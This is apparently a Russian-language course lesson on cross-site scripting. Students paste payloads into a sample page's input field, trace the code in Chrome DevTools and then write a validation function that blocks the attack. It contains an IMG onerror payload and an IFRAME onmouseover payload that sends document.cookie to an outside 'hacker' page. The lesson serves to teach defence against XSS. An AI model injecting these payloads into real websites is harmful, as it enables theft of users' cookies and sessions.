# ![ico-30 study] XSS

XSS (Cross-Site Scripting — «межсайтовый скриптинг») — атака на веб-систему путем инъекции вредоносного кода
^^(вместо "C" используется "X", чтобы не было путаницы с CSS)^^

Внедренный код будет выполняться на компьютере пользователя.
Код может пересылать конфиденциальные данные  пользователя  веб-серверу хакера.

Разновидностей XSS-атак очень много.
Частично они отражаются на уровне браузера.
В данном примере мы  будем внедрять код при вводе пользовательских данных
и использовать обработчиков событий элементов для запуска внедренного кода.

[![ico-20 link] Перейдите по ссылке](samples/03).

Откройте **~Chrome DevTools~**.

![](illustrations/xss-atack.png)

Установите точки останова (~breakpoints~) для того, чтобы пошагово отслеживать выполнение кода и вносить изменения в код.

1. Скопируйте код ниже и вставьте его в поле ввода элемента ~input~:

~~~html
&lt;IMG SRC="images/hack.png"
     onerror="document.write(String.fromCharCode(88, 83, 83))"/>
~~~

это довольно безобидная "атака", которая просто перезапишет содержимое ~body~

2. Посмотрите на содержимое куки страницы до вставки вредоносного кода в поле input:

![](illustrations/xss-atack-cookie.png)

Скопируйте код ниже и вставьте его в поле ввода элемента ~input~:

~~~html
&lt;IFRAME SRC=js/attack.html
  onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' + document.cookie, '_self')">
</IFRAME>
~~~

На страницу будет вставлен фрейм, в котором будет открыта страница хакера, которой будут переданы данные, хранящиеся в cookie.

При наведении курсора на этот фрейм будет происходить переход на страницу хакера.

^^с помощью такой строки можно украсть cookie с компьютера пользователя, где хранится конфиденциальная информация о нем.^^


## ![ico-25 hw] Задание

В панели навигации откройте файл **~js/index03.js~**.

Установите breakpoints.

![](illustrations/xss-atack-breakpoints.png)

Измените по своему усмотрению содержимое куки.

Измените код функции валидации ввода пользователя (**~testUserText~**).

В случае XSS атаки функция должна заменить текст, введенный пользователем, на сообщение: "_XSS атака отражена_" с указанием текущей даты и времени.

Сохраните изменения и продолжите выполение кода.

__________________________________________________________

[![ico-20 link] XSS](https://owasp.org/www-community/attacks/xss/)
[![ico-20 link] websitesecurity](https://www.acunetix.com/websitesecurity/cross-site-scripting/)
